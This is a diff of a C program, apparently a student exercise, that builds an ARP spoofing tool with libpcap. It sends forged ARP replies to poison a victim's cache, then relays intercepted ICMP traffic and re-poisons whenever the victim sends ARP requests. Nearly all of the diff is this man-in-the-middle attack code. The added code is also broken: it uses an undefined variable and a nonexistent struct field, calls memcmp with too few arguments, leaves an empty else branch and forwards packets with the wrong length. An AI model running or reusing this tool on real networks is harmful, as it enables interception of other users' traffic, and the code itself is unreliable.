@@ -72,8 +72,8 @@ int main(int argc, char* argv[])
 	struct ifreq ifrq;
 	struct arphdr s_arphdr, fake_arphdr;
 	uint8_t* mymac=(uint8_t*)malloc(6*sizeof(uint8_t));
-	uint8_t* s_mac=(uint8_t*)malloc(6*sizeof(uint8_t));
 	uint8_t* t_mac=(uint8_t*)malloc(6*sizeof(uint8_t));
+	uint8_t* s_mac=(uint8_t*)malloc(6*sizeof(uint8_t));
 	
 	if (argc != 4)
 	{
@@ -120,21 +120,21 @@ int main(int argc, char* argv[])
 	printf("%s\n",inet_ntop(AF_INET,&sin->sin_addr,ipbuf,sizeof(ipbuf)));
 
 
-	//make sender's arp packet
-	memset(t_mac, NULL, 6*sizeof(uint8_t));
-	make_arp_pkt(&s_arphdr, mymac, t_mac, 1);
+	//make arp packet(attacker to sender)
+	memset(s_mac, NULL, 6*sizeof(uint8_t));
+	make_arp_pkt(&s_arphdr, mymac, s_mac, 1);
 	inet_pton(AF_INET, ipbuf, &s_arphdr.sender_ip);
 	inet_pton(AF_INET, argv[2], &s_arphdr.target_ip);
 	
-	//make ethernet packet
+	//make ethernet packet(attacker to sender)
 	struct ethhdr s_ethpkt;
 	int size;
-	memset(t_mac, 255, 6*sizeof(uint8_t));
-	make_ether_pkt(&s_ethpkt, t_mac, mymac, s_arphdr);
+	memset(s_mac, 255, 6*sizeof(uint8_t));
+	make_ether_pkt(&s_ethpkt, s_mac, mymac, s_arphdr);
 	size=sizeof(struct ethhdr)+sizeof(struct arphdr);
 	uint8_t* s_packet=(uint8_t*)malloc(size*sizeof(uint8_t));
 	memcpy(s_packet, &s_ethpkt, size*sizeof(uint8_t));
-	
+
 	//send packet	
   	char* dev = argv[1];
  	char errbuf[PCAP_ERRBUF_SIZE];
@@ -152,14 +152,13 @@ int main(int argc, char* argv[])
 	}
 
 
-	//receive and parse packet -> get target mac
+	//receive and parse packet -> get sender's mac
 	while(1)
 	{
 		int j;
 		const uint8_t* r_packet;
 		struct pcap_pkthdr* header;
 		struct ethhdr* r_ethhdr;
-		//struct arphdr* t_arphdr;
 		int res = pcap_next_ex(handle, &header, &r_packet);
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
@@ -167,14 +166,14 @@ int main(int argc, char* argv[])
 		r_ethhdr = (struct ethhdr*)(r_packet);
 		if(r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806)
 		{
-			memcpy(t_mac, r_ethhdr->ether_shost, 6*sizeof(uint8_t));	//target mac 저장
-			printf("get target MAC : ");
+			memcpy(s_mac, r_ethhdr->ether_shost, 6*sizeof(uint8_t));	//sender mac 저장
+			printf("get sender MAC : ");
 			for(i=0;i<6;i++)
         		{
                 		if(i<5)
-		                        printf("%02x:",(unsigned char)t_mac[i]);
+		                        printf("%02x:",(unsigned char)s_mac[i]);
                 		else
-		                        printf("%02x\n",(unsigned char)t_mac[i]);
+		                        printf("%02x\n",(unsigned char)s_mac[i]);
         		}
 			break;
 		}
@@ -184,24 +183,90 @@ int main(int argc, char* argv[])
 
 	
 	//make fake arp packet
-	make_arp_pkt(&fake_arphdr, mymac, t_mac, 2);		//fake arp reply
-	inet_pton(AF_INET, argv[3], &fake_arphdr.sender_ip);	//with my mac
-	inet_pton(AF_INET, argv[2], &fake_arphdr.target_ip);	//with sender's mac
+	make_arp_pkt(&fake_arphdr, mymac, s_mac, 2);		//fake arp reply
+	inet_pton(AF_INET, argv[3], &fake_arphdr.sender_ip);	//with my ip
+	inet_pton(AF_INET, argv[2], &fake_arphdr.target_ip);	//with sender's ip
 	
 	//make fake ethernet packet
 	struct ethhdr fake_ethpkt;
-	make_ether_pkt(&fake_ethpkt, t_mac, mymac, fake_arphdr);
+	make_ether_pkt(&fake_ethpkt, s_mac, mymac, fake_arphdr);
 	uint8_t* fake_packet=(uint8_t*)malloc(size*sizeof(uint8_t));
 	memcpy(fake_packet, &fake_ethpkt, size*sizeof(uint8_t));
 	
 	if(pcap_sendpacket(handle, fake_packet, size))
         {
+                printf("Failed send fake arp packet\n");
+                return -1;
+        }
+
+	//make arp packet2(attacker to target)
+        memset(t_mac, NULL, 6*sizeof(uint8_t));
+        make_arp_pkt(&s_arphdr, mymac, t_mac, 1);
+        inet_pton(AF_INET, ipbuf, &s_arphdr.sender_ip);
+        inet_pton(AF_INET, argv[3], &s_arphdr.target_ip);
+
+        //make ethernet packet2(attacker to target)
+        memset(t_mac, 255, 6*sizeof(uint8_t));
+        make_ether_pkt(&s_ethpkt, t_mac, mymac, s_arphdr);
+        size=sizeof(struct ethhdr)+sizeof(struct arphdr);
+        memcpy(s_packet, &s_ethpkt, size*sizeof(uint8_t));
+
+        //send packet2(attacker to target)
+        if(pcap_sendpacket(handle, s_packet, size))
+        {       
                 printf("Failed send packet\n");
                 return -1;
         }
 
+	while(1)
+        {
+                res = pcap_next_ex(handle, &header, &r_packet);
+                if (res == 0) continue;
+                if (res == -1 || res == -2) break;
 
+                r_ethhdr = (struct ethhdr*)(r_packet);
 
+		//if icmp packet
+                if(r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0800)		//icmp is in ip packet
+                {
+			struct libnet_ipv4_hdr* r_ip_hdr;
+			r_ip_hdr = (struct libnet_ipv4_hdr*)(r_packet+14);
+			if(ip_hdr != NULL && ntohs(r_ip_hdr->ip_p) == 0x01)
+			{
+				//change mac
+				memcpy(r_ethhdr->ether_shost, mymac, 6*sizeof(uint8_t));
+				memcpy(r_ethhdr->ether_dhost, s_mac, 6*sizeof(uint8_t));
+				if(pcap_sendpacket(handle, r_packet, size))
+        			{
+			                printf("Failed send icmp packet\n");
+			                return -1;
+			        }
+			}
+			else
+				continue;
+                }
+	
+		//if arp packet
+		else if(r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806)
+		{
+			//arp request(broadcast) from sender
+			if(!memcmp(r_ethhdr->ether_shosts_mac, s_mac))
+			{
+				//send fake arp reply to sender
+				if(pcap_sendpacket(handle, fake_packet, size))
+        			{
+                			printf("Failed send fake arp packet\n");
+                			return -1;
+        			}
+			}
+			else
+				
+		}
+                else
+                        continue;
+        }
 
+	
+	
 
 }
